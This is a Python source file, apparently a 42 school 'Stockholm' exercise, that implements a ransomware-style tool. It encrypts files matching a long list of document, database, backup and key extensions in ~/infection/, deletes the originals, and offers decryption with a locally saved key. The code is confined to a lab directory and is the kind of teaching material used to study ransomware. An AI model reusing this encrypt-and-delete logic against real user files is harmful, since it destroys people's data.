# **************************************************************************** #
#                                                                              #
#                                                         :::      ::::::::    #
#    stockholm.py                                       :+:      :+:    :+:    #
#                                                     +:+ +:+         +:+      #
#    By: lguisado <lguisado@student.42.fr>          +#+  +:+       +#+         #
#                                                 +#+#+#+#+#+   +#+            #
#    Created: 2023/05/10 21:11:12 by lguisado          #+#    #+#              #
#    Updated: 2023/05/13 16:15:55 by lguisado         ###   ########.fr        #
#                                                                              #
# **************************************************************************** #

import argparse
import sys
import os
import random
import shutil
from pathlib import Path
from cryptography.fernet import Fernet

extensions = ['.doc', '.docx', '.xls', '.xlsx', '.ppt', '.pptx', '.pst', '.ost', '.msg',
		  '.eml', '.vsd', '.vsdx', '.txt', '.csv', '.rtf', '.123', '.wks', '.wk1', '.pdf',
		  '.dwg', '.onetoc2', '.snt', '.jpeg', '.jpg', '.docb', '.docm', '.dot', '.dotm',
		  '.dotx', '.xlsm', '.xlsb', '.xlw', '.xlt', '.xlm', '.xlc', '.xltx', '.xltm',
		  '.pptm', '.pot', '.pps', '.ppsm', '.ppsx', '.ppam', '.potx', '.potm', '.edb',
		  '.hwp', '.602', '.sxi', '.sti', '.sldx', '.sldm', '.vdi', '.vmdk', '.vmx', '.gpg',
		  '.aes', '.ARC', '.PAQ', '.bz2', '.tbk', '.bak', '.tar', '.tgz', '.gz', '.7z', '.rar',
		  '.zip', '.backup', '.iso', '.vcd', '.bmp', '.png', '.gif', '.raw', '.cgm', '.tif',
		  '.tiff', '.nef', '.psd', '.ai', '.svg', '.djvu', '.m4u', '.m3u', '.mid', '.wma',
		  '.flv', '.3g2', '.mkv', '.3gp', '.mp4', '.mov', '.avi', '.asf', '.mpeg', '.vob',
		  '.mpg', '.wmv', '.fla', '.swf', '.wav', '.mp3', '.sh', '.class', '.jar', '.java',
		  '.rb', '.asp', '.php', '.jsp', '.brd', '.sch', '.dch', '.dip', '.pl', '.vb', '.vbs',
		  '.ps1', '.bat', '.cmd', '.js', '.asm', '.h', '.pas', '.cpp', '.c', '.cs', '.suo',
		  '.sln', '.ldf', '.mdf', '.ibd', '.myi', '.myd', '.frm', '.odb', '.dbf', '.db', '.mdb',
		  '.accdb', '.sql', '.sqlitedb', '.sqlite3', '.asc', '.lay6', '.lay', '.mml', '.sxm',
		  '.otg', '.odg', '.uop', '.std', '.sxd', '.otp', '.odp', '.wb2', '.slk', '.dif', '.stc',
		  '.sxc', '.ots', '.ods', '.3dm', '.max', '.3ds', '.uot', '.stw', '.sxw', '.ott', '.odt',
		  '.pem', '.p12', '.csr', '.crt', '.key', '.pfx', '.der']
path = str(Path.home()) + '/infection/'

def parser_arg():
	parser = argparse.ArgumentParser(description="Stockholm")
	parser.add_argument('-v', '--version', type=str, nargs='?', default=0, help='Show program version')
	parser.add_argument('-r', '--reverse', const='deckey.key', type=str, nargs='?', help='Decrypt files')
	parser.add_argument('-s', '--silent', type=str, nargs='?', default=0, help='Work in silent mode')
	parser.add_argument('-d', '--directory', default=path, type=str, nargs='?', help='Choose the path where the files will be decrypted')
	parser.add_argument('-g', '--generate', type=str, nargs='?', default=0, help='Create directory to encrypt with files')
	args = parser.parse_args()
	return args

def encrypt_key(args):
	if not os.path.exists(path + '/'):
		print("Directory not found")
		exit()
	key = Fernet.generate_key()
	with open('deckey.key', 'wb') as filekey:
		filekey.write(key)
	for filename in os.listdir(path):
		for extension in extensions:
			if filename.endswith(extension) and not ".ft" in filename:
				if args.silent is not None:
					print(path + filename + ".ft")
				encrypt_file(filename, key)

def encrypt_file(name, key):
	with open(path + name, 'rb') as file:
		file_data = file.read()
	os.remove(path + name)
	data_encrypted = Fernet(key).encrypt(file_data)
	with open(path + name + ".ft", 'wb') as file:
		file.write(data_encrypted)

def decrypt_key(args):
	try:
		with open(str(args.reverse), 'rb') as file:
			dec = file.read()
	except:
		print("Error: Wrong file.key")
		exit()
	decode = Fernet(dec)
	for filename in os.listdir(path):
			if ".ft" in filename:
				if args.silent is not None:
					print(path + filename[:-3])
				decrypt_file(filename, decode, args)

def decrypt_file(name, decode, args):
	with open(path + name, 'rb') as file:
		encrypted = file.read()
	try:
		decrypted = decode.decrypt(encrypted)
	except:
		print("Error: Wrong key")
		exit()
	os.remove(path + name)
	if not args.directory.endswith('/'):
		args.directory = args.directory + '/'
	with open(args.directory + name[:-3], 'wb') as file:
		file.write(decrypted)

def	generate_directory():
	try:
		os.mkdir(path)
	except FileExistsError:
		shutil.rmtree(path)
		os.mkdir(path)
	for i in range(0, 300):
		file = path + str(i) + random.choice(extensions)
		os.system(f'touch {file}')
	print("Directory created")

if __name__ == "__main__":
	args = parser_arg()
	if args.generate is None:
		generate_directory()
	elif args.reverse:
		decrypt_key(args)
	elif args.version is None:
		print("Stockholm lguisado 1.0")
	elif len(sys.argv) == 1 or (len(sys.argv) == 2 and args.silent is None):
		encrypt_key(args)